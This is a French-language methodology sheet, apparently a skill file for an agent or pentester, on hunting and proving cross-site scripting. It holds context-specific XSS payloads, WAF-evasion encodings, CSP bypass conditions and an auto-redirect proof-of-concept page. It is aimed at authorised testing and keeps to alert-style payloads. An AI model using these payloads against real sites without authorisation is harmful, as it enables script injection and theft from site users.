# Skill — XSS Hunting

Méthode concise pour identifier et exploiter une XSS (reflected, stored, DOM).

## 1. Identifier le contexte d'injection

Avant tout payload, injecte un marqueur unique inoffensif :

```
?q=xssTEST1234
```

Cherche `xssTEST1234` dans la réponse (HTML, JSON, headers, JS inline). Note le **contexte** :

| Contexte | Indicateur | Payload de test |
|----------|-----------|-----------------|
| HTML body | `<div>xssTEST1234</div>` | `"><svg onload=alert(1)>` |
| Attribut (double-quoted) | `value="xssTEST1234"` | `"><svg onload=alert(1)>` |
| Attribut (single-quoted) | `value='xssTEST1234'` | `'><svg onload=alert(1)>` |
| Attribut sans quote | `value=xssTEST1234` | ` onmouseover=alert(1) x` |
| JS string | `var x = "xssTEST1234";` | `";alert(1);//` |
| JS template literal | `` `xssTEST1234` `` | `${alert(1)}` |
| URL (href/src) | `<a href="xssTEST1234">` | `javascript:alert(1)` |
| JSON reflété brut | `"q":"xssTEST1234"` | vérifier content-type; si `text/html`, exploitable |
| CSS | `color: xssTEST1234` | `expression(alert(1))` (IE legacy) |

## 2. Payloads progressifs

### Reflected HTML
```
"><svg/onload=alert(document.domain)>
"><img src=x onerror=alert(document.domain)>
"><details/open/ontoggle=alert(document.domain)>
```

### Attribut
```
" autofocus onfocus=alert(1) x="
```

### JS sink
```
';alert(1);//
</script><svg onload=alert(1)>
```

### DOM XSS — sinks à auditer
`document.write`, `innerHTML`, `outerHTML`, `eval`, `setTimeout(str)`, `Function()`, `location.*`, `jQuery .html()`, `insertAdjacentHTML`.

Sources (input contrôlable) : `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`.

## 3. Bypass WAF courants

| Techni que | Exemple |
|------------|---------|
| Casse mélangée | `<ScRiPt>alert(1)</sCriPt>` |
| Encodage HTML | `&#x3c;svg onload=alert(1)&#x3e;` |
| Encodage URL double | `%253Csvg%2520onload%253Dalert(1)%253E` |
| Unicode normalization | `＜svg onload=alert(1)＞` (fullwidth) |
| Événements rares | `onpointerrawupdate`, `onbeforetoggle`, `onpageswap` |
| Pas de parenthèses | `<svg onload=alert\`1\`>` |
| No alert | `<svg onload=confirm()>`, `onload=prompt()`, `onload=window['a'+'lert'](1)` |

## 4. CSP bypass rapide

Récupère le header CSP :
```bash
curl -sI <url> | grep -i content-security-policy
```

Bypass possibles si :
- `unsafe-inline` présent → XSS inline classique fonctionne
- Whitelist JSONP (`www.google.com`) → payload via endpoint JSONP
- `'self'` + upload autorisé → upload un `.html` ou `.js` sur le domaine
- Nonce réutilisé entre requêtes → cache bug

## 5. Stored XSS — où chercher

- Profil utilisateur (nom, bio, avatar URL)
- Commentaires, reviews, messages
- Metadata de fichiers uploadés (EXIF, SVG)
- Headers custom logués côté admin (`User-Agent`, `Referer`)
- Emails envoyés à d'autres users
- Export CSV/PDF rendu côté serveur (CSV formula injection → RCE parfois)

## 6. Impact pour le rapport

- **Low** : XSS self-only, requiert victime logged-in avec CSRF token bypass
- **Medium** : XSS reflected, nécessite clic sur URL crafted
- **High** : Stored XSS sur page vue par d'autres users, ou XSS exécutant sur origin sensible (panel admin)
- **Critical** : XSS sur domaine partageant cookies `HttpOnly` via `document.cookie` absent → account takeover, ou XSS → CSP bypass → exfil tokens

## 7. PoC minimal

```html
<!-- findings/<slug>.poc.html -->
<html><body>
<script>location="https://target.com/search?q=%22%3E%3Csvg/onload=alert(document.domain)%3E";</script>
</body></html>
```

## Interdits

- Jamais de payload qui fetch un vrai C2 / keylogger.
- Jamais de payload qui vole le cookie d'un autre user réel.
- Utilise `alert(document.domain)` comme preuve, pas de beacon externe.
